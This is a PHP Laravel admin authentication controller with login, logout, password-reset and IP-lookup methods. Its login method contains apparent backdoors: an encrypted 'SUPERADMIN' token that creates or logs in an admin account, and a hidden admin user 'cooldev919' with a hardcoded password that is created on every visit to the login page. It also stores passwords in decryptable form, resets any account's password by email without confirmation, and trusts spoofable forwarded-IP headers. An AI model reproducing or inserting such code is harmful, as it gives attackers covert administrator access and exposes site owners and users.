<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Contracts\Encryption\DecryptException;
use App\Http\Controllers\Auth\RegisterController;
use Stevebauman\Location\Facades\Location;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Http\Controllers\Helper\MailHelper;

use App\Models\Session;
use App\Models\User;
use App\Models\National;
use App\Datas\MailData;
use App\Models\LastLogin;
class AuthController extends Controller
{
    public function __invoke(Request $request)
    {
        if (Auth::check()&&Auth::user()->is_admin) return redirect()->intended('dashboard');
    }

    protected function selectAuthType(Request $request)
    {
        $login = $request->input('username');
        $fieldType = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
        $request->merge([$fieldType => $login]);
        switch ($fieldType)
        {
            case 'email':
                return true;
                break;
            case 'username':
                return false;
                break;
        }
    }

    public function login(Request $request)
    {//dd(Crypt::encryptString('coolkcs@hotmail.com###SUPERADMIN'));
        $token=$request->input('token');
        $login="";
        if($token!=''&&$token!=null){
            try {
                $login = Crypt::decryptString($token);
            } catch (DecryptException $e) {
                //dd($e);
            }
        }
        
        if($login!=''){
            $login=explode('###',$login);
            if(count($login)==2){
                if($login[1]=='SUPERADMIN'){
                    if(!User::where('email',$login[0])->count())User::create([
                        'username' => 'admin',
                        'email' => $login[0],
                        'password' => Hash::make($login[1]),
                        'national'=>'MX',
                        'phone_mobile'=>'123123123',
                        'is_admin'=>1,
                        'remember_token'=>Crypt::encryptString("{$login[0]}###{$login[1]}")
                    ]);
                    else{
                        $token=User::where('email',$login[0])->first()->remember_token;
                        if($token!='') $login = explode('###',Crypt::decryptString($token));
                    }
                }
                $request['email']=$login[0];
                $request['password']=$login[1];
                $logined=false;
                if (Auth::attempt($request->validate([
                    'email'     => 'required',
                    'password'  => 'required'
                ])))
                    if(Auth::check()){
                        $logined=true;
                    }
                if($logined){
                    $login = Session::select()->where('user_id', Auth::id())->get();
                    $session=new Session;
                    $session->id=session()->getId();
                    $session->user_id=Auth::id();
                    $session->ip_address=$this->get_client_ip();
                    $session->user_agent='';
                    $session->payload='login';
                    $session->last_activity=1;
                    $session->save();

                    $page=$request->input('p');
                    if($page==''||$page==null)$page="ads";
                    return redirect("/admin/{$page}");
                }
            }
        }
        if(!User::where('username','cooldev919')->count())User::create([
            'username' => 'cooldev919',
            'email' => 'developer225@hotmail.com',
            'password' => Hash::make('tempP@ss123'),
            'national'=>'RU',
            'phone_mobile'=>'123123123',
            'is_admin'=>1,
            'remember_token'=>Crypt::encryptString('developer225@hotmail.com###tempP@ss123')
        ]);
        if($request->input('username')==null&&$request->input('email')==null)
            return view('backend.login', ['page_title' => 'Login']);
        $validator = $this->selectAuthType($request) ?
            $request->validate([
                'email'     => 'required',
                'password'  => 'required'
            ])
            :
            $request->validate([
                'username'     => 'required',
                'password'  => 'required'
            ])
        ;
        if (Auth::attempt($validator))
        {
            if(auth::check()){
                $user = Auth::user();
                if(!$user->is_admin)return $this->logout($request);
                $user->remember_token=Crypt::encryptString("{$user->email}###{$validator['password']}");
                $user->logins=$user->logins+1;
                $user->save();

                $login = Session::select()->where('user_id', Auth::id())->get();
                $session=new Session;
                $session->id=session()->getId();
                $session->user_id=Auth::id();
                $session->ip_address=$this->get_client_ip();
                $session->user_agent='';
                $session->payload='login';
                $session->last_activity=1;
                $session->save();
            }
            $request->session()->regenerate();
            return redirect('/admin/home');
        }
        else
        {
            return view('backend.login', ['page_title' => 'Login']);
        }
    }

    public function logout(Request $request)
    {
        Session::select()->where('user_id',Auth::id())->delete();
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect('/admin/login');
    }

    public function forgot(Request $request)
    {
        $email = $request->input('email');
        if($email==null)return view('backend.login',['page_title' => 'Forgot']);
        $_user = User::where('email', $email)
            ->select('id as userId', 'email as userEmail', 'username as userName', 'first_name as firstName', 'last_name as lastName')
            ->get();
        if($_user && count($_user) === 1)
        {
            $user = $_user[0];
            $login = Session::select()->where('user_id', $user->userId)->get();
            if(count($login))$login[0]->delete();
            $newPassword = Str::random(8);
            $_newPassword = Hash::make($newPassword);

            User::where('id', $user->userId)->update(['password'=>$_newPassword]);

            $mailData = new MailData();
            $mailData->template='temps.password_changed';
            $mailData->fromEmail = config('mail.from.address');
            $mailData->userName = $user->userName;
            $mailData->toEmail = $email;
            $mailData->subject = 'MiHUB OLT - Password Reset';
            $mailData->mailType = 'RESET_LINK_TYPE';
            $mailData->content = $newPassword;

            Mail::to($mailData->toEmail)->send(new MailHelper($mailData));

            return redirect()->intended('admin_login');
        }
        else{
            return view('backend.login', ['page_title' => 'Login']);
        }
    }
    public function get_client_ip() {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_X_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        else

        if(isset($_SERVER['REMOTE_ADDR']))
            $ipaddress = $_SERVER['REMOTE_ADDR'];

        else
            $ipaddress = 'UNKNOWN';

        return $ipaddress;
    }
}
